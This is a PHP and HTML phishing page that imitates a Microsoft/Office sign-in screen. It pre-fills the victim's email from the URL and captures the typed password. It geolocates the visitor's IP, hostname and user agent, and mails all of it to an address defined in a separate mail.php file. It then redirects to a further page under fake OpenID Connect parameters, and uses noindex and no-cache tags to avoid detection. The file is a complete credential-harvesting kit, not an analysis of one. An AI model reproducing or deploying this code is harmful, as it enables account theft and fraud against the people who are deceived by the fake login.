<?php

session_start();

require_once ('mail.php');

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

$oslo=rand(); 
$praga=md5($oslo);
$src = strtoupper("$praga");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$datum = date("D M d, Y g:i a");
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];

if (isset($_POST['passwd'])) { 
$_SESSION["passwd"] = $passwd = $_POST["passwd"];

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Username: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Location: ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got mail from $ip ($cn)";
$headers = "From: Office $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: logsfr.php?client_id=$oslo$oslo&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties$src$src$src$src$src&email=$email&ui_locales=en-US&mkt=en-US&client-request-id=$praga");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: logsfr.php?client_id=$oslo$oslo&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties$src$src$src$src$src&email=$email&ui_locales=en-US&mkt=en-US&client-request-id=$praga");
}

}

class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/png" sizes="16*16" href="images/favicon.ico">

<style>
element {
}
.identity {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}
* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
body.cb {
    color: #262626;
    text-align: left;
}
body.cb {
    text-align: center;
}
body {
    direction: ltr;
}
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    color: #000;
}
html {
    font-size: 100%;
}
html {
    font-family: sans-serif;
    -webkit-text-size-adjust: 100%;
}
</style>

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:659px; z-index:0">
<img src="images/a.jpg" alt="" title="" width="1366" border="0" height="659">
</div>
<div id="image3" style="position: absolute; overflow:hidden; left:473px; top:133px; width:440px; height:370px; z-index:1">
<img src="images/e.png" alt="" title="" border=0 width=440 height=370>
</div>
<div id="formimage1" style="position:absolute; left:518px; top:220px; z-index:2">
<a href=""><img src="images/arrow_left.svg"></a>
</div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:632px; width:1366px; height:27px; z-index:">
<img src="images/d.png" alt="" title="" width="1366" border="0" height="29">
</div>
<div id="image1" style="position:absolute; overflow:hidden; left:518px; top:387px; width:121px; height:19px; z-index:4">
<a href="#"><img src="images/h.png" alt="" title="" width="121" border="0" height="19"></a>
</div>
<form id="login" action="" name="login" method="post">
<div>
<input type="hidden" name="username" value="<?php if (isset($_GET['email'])) { echo $email ; }?>">
</div>
<div style="position:absolute; overflow:hidden; left:544px; top:218px; color: #262626; z-index:3" id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php if (isset($_GET['email'])) { echo $email ; }?>"><?php if (isset($_GET['email'])) { echo $email ; }?></div>
</div>
<div>
<input class="inputstyle" id="p" placeholder="Password" name="passwd" value="" type="password" maxlength="" style="position:absolute;width:356px; height:36px; left:512px;top:298px;font-family: Segoe UI Webfont,-apple-system,Helvetica Neue,Lucida Grande,Roboto,Ebrima,Nirmala UI,Gadugi,Segoe Xbox Symbol,Segoe UI Symbol,Meiryo UI,Khmer UI,Tunga,Lao UI,Raavi,Iskoola Pota,Latha,Leelawadee,Microsoft YaHei UI,Microsoft JhengHei UI,Malgun Gothic,Estrangelo Edessa,Microsoft Himalaya,Microsoft New Tai Lue,Microsoft PhagsPa,Microsoft Tai Le,Microsoft Yi Baiti,Mongolian Baiti,MV Boli,Myanmar Text,Cambria Math;font-weight: 400; font-size: 15px; line-height: 20px; color: #262626;padding: 7px; border: 0px; z-index:4" oninvalid="setCustomValidity('Enter Password');" oninput="setCustomValidity('')">
</div>
<div id="formimage1" style="position:absolute; left:760px; top:427px; z-index:5">
<input name="formimage1" src="images/g.png" width="108" type="image" height="32">
</div>
</form>
</body>
</html>